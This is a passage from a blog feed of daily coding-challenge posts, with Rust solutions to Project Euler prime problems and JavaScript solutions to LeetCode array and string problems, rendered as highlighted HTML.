class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp_mask &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            tmp_p /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> cnt == <span class="number">3</span> &amp;&amp; num &lt; <span class="number">3</span> &#123;</span><br><span class="line">            *pattern = s;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> x = s &amp; -s;</span><br><span class="line">        <span class="keyword">let</span> y = s + x;</span><br><span class="line">        s = ((s &amp; !y) / x &gt;&gt; <span class="number">1</span>) | y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">count</span></span>(p: <span class="built_in">usize</span>, pattern: <span class="built_in">isize</span>, size: <span class="built_in">usize</span>, sieve: &amp;Sieve) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cnt: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> dw_bd = <span class="keyword">if</span> (pattern &lt;&lt; <span class="number">1</span>) &gt; (<span class="number">1</span> &lt;&lt; size) &#123; <span class="number">1</span> &#125; <span class="keyword">else</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dw_bd..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> size = size;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp_mask = pattern;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp_p = p;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> bcnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> size != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> tmp_mask &amp; <span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line">                num += i * <span class="number">10usize</span>.pow(bcnt);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                num += tmp_p % <span class="number">10</span> * <span class="number">10usize</span>.pow(bcnt);</span><br><span class="line">            &#125;</span><br><span class="line">            tmp_mask &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            tmp_p /= <span class="number">10</span>;</span><br><span class="line">            bcnt += <span class="number">1</span>;</span><br><span class="line">            size -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> sieve.is_prime(num) &#123;</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="153-Find-Minimum-in-Rotated-Sorted-Array"><a href="#153-Find-Minimum-in-Rotated-Sorted-Array" class="headerlink" title="153. Find Minimum in Rotated Sorted Array"></a>153. Find Minimum in Rotated Sorted Array</h3><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e.,  <code>[0,1,2,4,5,6,7]</code> might become  <code>[4,5,6,7,0,1,2]</code>).</p><p>Find the minimum element.</p><p>You may assume no duplicate exists in the array.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,4,5,1,2] </span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [4,5,6,7,0,1,2]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Binary search.</p><img src="/2019-02-09-Daily-Challenge/2.png" title="binary_search"><p>And the solution on the website is not grace.</p><p>All binary search with two possible return value(left and right) is b**ls**t.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><p>recursive:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> findmin = <span class="function">(<span class="params">begin, end</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[begin] &lt;= nums[end]) &#123;</span><br><span class="line">      <span class="keyword">return</span> nums[begin];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((begin+end)/<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &gt;= nums[begin]) &#123;</span><br><span class="line">        <span class="keyword">return</span> findmin(mid+<span class="number">1</span>, end);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> findmin(begin, mid);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> findmin(<span class="number">0</span>, nums.length<span class="number">-1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>non-recursive:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> begin = <span class="number">0</span>, end = nums.length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (nums[begin] &gt; nums[end]) &#123;</span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((begin + end) / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (nums[mid] &gt;= nums[begin]) &#123;</span><br><span class="line">      begin = mid + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      end = mid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums[begin]; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-08 Daily Challenge</title>
      <link href="/2019-02-08-Daily-Challenge/"/>
      <url>/2019-02-08-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Self powers</em> in <em>Rust</em> and <em>Summary Ranges</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Consecutive-prime-sum"><a href="#Consecutive-prime-sum" class="headerlink" title="Consecutive prime sum"></a>Consecutive prime sum</h3><h3 id="Problem-50"><a href="#Problem-50" class="headerlink" title="Problem 50"></a>Problem 50</h3><p>The prime 41, can be written as the sum of six consecutive primes:</p><p>41 = 2 + 3 + 5 + 7 + 11 + 13</p><p>This is the longest sum of consecutive primes that adds to a prime below one-hundred.</p><p>The longest sum of consecutive primes below one-thousand that adds to a prime, contains 21 terms, and is equal to 953.</p><p>Which prime, below one-million, can be written as the sum of the most consecutive primes?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> LIMIT: <span class="built_in">usize</span> = <span class="number">1_000_000</span>;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(LIMIT);</span><br><span class="line">    <span class="keyword">let</span> bound = sieve.prime_pi(LIMIT);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..bound &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> i + cnt &gt; bound &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> sum &lt; LIMIT &#123;</span><br><span class="line">            <span class="keyword">if</span> offset &gt; cnt &amp;&amp; sieve.is_prime(sum) &#123;</span><br><span class="line">                ans = sum;</span><br><span class="line">                cnt = offset;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += sieve.nth_prime(i + offset);</span><br><span class="line">            offset += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="228-Summary-Ranges"><a href="#228-Summary-Ranges" class="headerlink" title="228. Summary Ranges"></a>228. Summary Ranges</h3><p>Given a sorted integer array without duplicates, return the summary of its ranges.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input:  [0,1,2,4,5,7]</span><br><span class="line">Output: [&quot;0-&gt;2&quot;,&quot;4-&gt;5&quot;,&quot;7&quot;]</span><br><span class="line">Explanation: 0,1,2 form a continuous range; 4,5 form a continuous range.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input:  [0,2,3,4,6,8,9]</span><br><span class="line">Output: [&quot;0&quot;,&quot;2-&gt;4&quot;,&quot;6&quot;,&quot;8-&gt;9&quot;]</span><br><span class="line">Explanation: 2,3,4 form a continuous range; 8,9 form a continuous range.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;string[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> summaryRanges = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (nums.length === <span class="number">0</span>) <span class="keyword">return</span> [];</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">let</span> begin = nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">let</span> cur = nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] - cur === <span class="number">1</span>) cur += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (cur === begin) ans.push(cur+<span class="string">""</span>);</span><br><span class="line">      <span class="keyword">else</span> ans.push(begin+<span class="string">"-&gt;"</span>+cur);</span><br><span class="line">      begin = cur = nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cur === begin) ans.push(cur+<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">else</span> ans.push(begin+<span class="string">"-&gt;"</span>+cur);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-07 Daily Challenge</title>
      <link href="/2019-02-07-Daily-Challenge/"/>
      <url>/2019-02-07-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Self powers</em> in <em>Rust</em> and <em>Average of Levels in Binary Tree</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Prime-permutations"><a href="#Prime-permutations" class="headerlink" title="Prime permutations"></a>Prime permutations</h3><h3 id="Problem-49"><a href="#Problem-49" class="headerlink" title="Problem 49"></a>Problem 49</h3><p>The arithmetic sequence, 1487, 4817, 8147, in which each of the terms increases by 3330, is unusual in two ways: (i) each of the three terms are prime, and, (ii) each of the 4-digit numbers are permutations of one another.</p><p>There are no arithmetic sequences made up of three 1-, 2-, or 3-digit primes, exhibiting this property, but there is one other 4-digit increasing sequence.</p><p>What 12-digit number do you form by concatenating the three terms in this sequence?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I thought there is only (i) and (ii) required, but <code>each of the terms increases by 3330</code> is required, too......</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><p>Wrong solution</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"><span class="keyword">use</span> std::string::<span class="built_in">String</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(<span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">let</span> up_bound = sieve.prime_pi(<span class="number">10000</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> down_bound = sieve.prime_pi(<span class="number">1000</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> map: HashMap&lt;<span class="built_in">usize</span>, <span class="built_in">usize</span>&gt; = HashMap::new();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> down_bound..up_bound &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = sieve.nth_prime(i);</span><br><span class="line">        <span class="keyword">if</span> tmp != <span class="number">1487</span> &amp;&amp; tmp != <span class="number">4817</span> &amp;&amp; tmp != <span class="number">8147</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = f(tmp);</span><br><span class="line">            <span class="keyword">if</span> map.contains_key(&amp;key) &#123;</span><br><span class="line">                *map.get_mut(&amp;key).unwrap() += <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.insert(key, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">String</span> = <span class="built_in">String</span>::new();</span><br><span class="line">    <span class="keyword">for</span> (key, value) <span class="keyword">in</span> map &#123;</span><br><span class="line">        <span class="keyword">if</span> value == <span class="number">3</span> &#123;</span><br><span class="line">            k = key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> down_bound..up_bound &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = sieve.nth_prime(i);</span><br><span class="line">        <span class="keyword">if</span> f(tmp) == k &#123;</span><br><span class="line">            ans = <span class="built_in">format!</span>(<span class="string">"&#123;&#125;&#123;&#125;"</span>, ans, tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">f</span></span>(<span class="keyword">mut</span> tmp: <span class="built_in">usize</span>) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp_vec = <span class="built_in">vec!</span>[];</span><br><span class="line">    <span class="keyword">while</span> tmp != <span class="number">0</span> &#123;</span><br><span class="line">        tmp_vec.push(tmp % <span class="number">10</span>);</span><br><span class="line">        tmp /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp_vec.sort();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp_vec &#123;</span><br><span class="line">        key *= <span class="number">10</span>;</span><br><span class="line">        key += i;</span><br><span class="line">    &#125;</span><br><span class="line">    key</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Right solution:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"><span class="keyword">use</span> std::string::<span class="built_in">String</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(<span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">let</span> up_bound = sieve.prime_pi(<span class="number">3330</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> down_bound = sieve.prime_pi(<span class="number">1000</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">String</span> = <span class="built_in">String</span>::new();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> down_bound..up_bound &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = sieve.nth_prime(i);</span><br><span class="line">        <span class="keyword">if</span> tmp != <span class="number">1487</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> f(tmp) == f(tmp+<span class="number">3330</span>) &amp;&amp; sieve.is_prime(tmp+<span class="number">3330</span>) &amp;&amp; f(tmp) == f(tmp+<span class="number">6660</span>) &amp;&amp; sieve.is_prime(tmp+<span class="number">6660</span>) &#123;</span><br><span class="line">                ans = <span class="built_in">format!</span>(<span class="string">"&#123;&#125;&#123;&#125;&#123;&#125;"</span>, tmp, tmp+<span class="number">3330</span>, tmp+<span class="number">6660</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">f</span></span>(<span class="keyword">mut</span> tmp: <span class="built_in">usize</span>) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp_vec = <span class="built_in">vec!</span>[];</span><br><span class="line">    <span class="keyword">while</span> tmp != <span class="number">0</span> &#123;</span><br><span class="line">        tmp_vec.push(tmp % <span class="number">10</span>);</span><br><span class="line">        tmp /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp_vec.sort();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp_vec &#123;</span><br><span class="line">        key *= <span class="number">10</span>;</span><br><span class="line">        key += i;</span><br><span class="line">    &#125;</span><br><span class="line">    key</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="125-Valid-Palindrome"><a href="#125-Valid-Palindrome" class="headerlink" title="125. Valid Palindrome"></a>125. Valid Palindrome</h3><p>Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.</p><p><strong>Note:</strong> For the purpose of this problem, we define empty string as valid palindrome.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;A man, a plan, a canal: Panama&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;race a car&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/[^0-9a-zA-Z]/gm</span>, <span class="string">""</span>).toLocaleLowerCase();</span><br><span class="line">  <span class="keyword">return</span> s.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>) === s;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(isPalindrome("A man, a plan, a canal: Panama"));</span></span><br><span class="line"><span class="comment">// console.log(isPalindrome("race a car"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-06 Daily Challenge</title>
      <link href="/2019-02-06-Daily-Challenge/"/>
      <url>/2019-02-06-Daily-Challenge/</url>
